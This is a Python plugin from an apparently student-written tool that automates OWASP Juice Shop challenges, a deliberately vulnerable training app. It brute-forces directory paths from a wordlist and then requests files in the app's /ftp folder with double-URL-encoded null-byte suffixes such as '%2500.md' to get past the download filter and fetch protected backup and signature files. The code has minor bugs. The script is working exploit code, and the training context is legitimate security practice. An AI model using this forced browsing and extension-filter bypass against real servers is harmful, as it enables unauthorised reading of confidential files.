"""
This file is to automate the OWASP JUICESHOP TASK
1.EASTER EGG
2.FORGETTEN DEVELOPER Backup
3.MISPLACED SIGNATURE FILE
4.ACCESS LOG  --> NOT solved
-------------------------------------------------
METHODOLOGY:
1. scan the subnet to find ftp or support/logs, using brute force
2.1. query key from the response to get the path
     Keys: estere, package,
2.2. given the hint that the file is in .md, .pdf
3.1. scan the subnet using URL encoding of 00.md, 0.md
     0.pdf, 1.pdf by brute force
"""
# SOURCE FILE:    access_log.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve EASTER EGG, FORGETTEN DEVELOPER Backup, MISPLACED SIGNATURE FILE Challenge
#                 Brute force scan the subnet to find the confidential files
#
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
#--------------------------------------------------------------------------------------

import re
from plugins import attack as a
import json
import urllib
from urllib import parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#--------------------------------------------------------------------------------------
#Class: access_file
#Inherit: Attack
#--------------------------------------------------------------------------------------
class access_file(a.attack_inter):

# --------------------------------------------------------------------------------------
# FUNCTION: __init__
# ARGUMENTS: N/A
# RETURNS: void
# Description: Initial class variables
# --------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()

    def generator(self):
        pass

#--------------------------------------------------------------------------------------
#FUNCTION subnet_scan
#ARGUMENTS: N/A
#RETURNS: len_dict -> { length of the subnet: domain name of the subnet}
#         E.g. {'11234': ftp, '300': api}
#Description: This function is used to scan the subnet using different payload in common.txt
#             Special cases are extracted according to the length of the response text.
#NOTES:
#--------------------------------------------------------------------------------------

    def subnet_scan(self):
        len_dict = {}
        f = open('plugins/common.txt', 'r')
        while True:
            line = f.readline()
            if line:
                payload = a.URL + '/' + line[:-1]
                response = self.juice_session.get(payload)
                len_dict[str(len(json.dumps(response.text)))] = line[:-1]
            else:
                break
        return len_dict

#--------------------------------------------------------------------------------------
#FUNCTION parse_html
#ARGUMENTS: string ->
#           subnet -> subnet found by subnet scan
#           tag ->
#RETURNS: href[0][0][:idx]  --> will be embedded into POST request json field.
#Description: This function is used to find the
#
#NOTES:
#--------------------------------------------------------------------------------------
    def parse_html(self, string, subnet, tag):
        print(tag)
        pattern = '<a.*?href="({}/{}.+)".*?>(.*?)</a>'.format(subnet, tag)
        try:
            href = re.findall(pattern, string)
            print(href)
            idx = href[0][0].find('"')
            return href[0][0][:idx]
        except:
            print( '{} NOT find, please use other script').format(tag)


    def find_confidential(self,subnet, confidential_tag):
        response = self.juice_session.get(a.URL+'/'+str(subnet))
        print(response.text)
        sub_url = self.parse_html(response.text, subnet, confidential_tag)
        response = self.juice_session.get( a.URL + '/' + str(sub_url))
        #print(response.text) ## This is imporatant, because it reminds us of .md/.pdf
        # encoding of '0.md', '1.md','1.pdf','00.md','000.md' respectively in the below attemping list
        attempting = ['%25%30%2e%6d%64', '%25%31%2e%6d%64', '%25%31%2e%70%64%66','%25%30%30%2e%70%64%66','%2500.md']
        i = 0
        while response.status_code != 200:
            if i == len(attempting):
                break
            i += 1
            response = self.juice_session.get(a.URL + '/' + str(sub_url) + attempting[i])
        # you can also find the encoding of '00.md
        print(response.text)
        print(response.status_code)


    def run(self):
        subnet_list = [value for value in self.subnet_scan().values()]## using the subnet scan, we found 4 kinds of subnet, and we can open them manually, and in this case, we found that ftp is indeed useful.
        #subnet_list_modify = [i.replace('http://localhost:3000/','') for i in subnet_list]
        #print(subnet_list_modify)
        ## output = ['ver2', 'api', 'rest', 'ftp', 'profile', 'promotion', 'redirect', 'restaurants', 'restore', 'restored', 'restricted', 'robots.txt', 'snippets', 'support/logs']
        self.find_confidential(subnet='ftp',confidential_tag='easter') ## challenge" Easter's egg
        self.find_confidential(subnet='ftp',confidential_tag='package') ## challenge FORGETTEN DEVELOPER Backup
        self.find_confidential(subnet='ftp',confidential_tag='suspicious') ## challenge MISPLACED SIGNATURE FILE
        #self.find_confidential(subnet='support/logs/',confidential_tag='access')



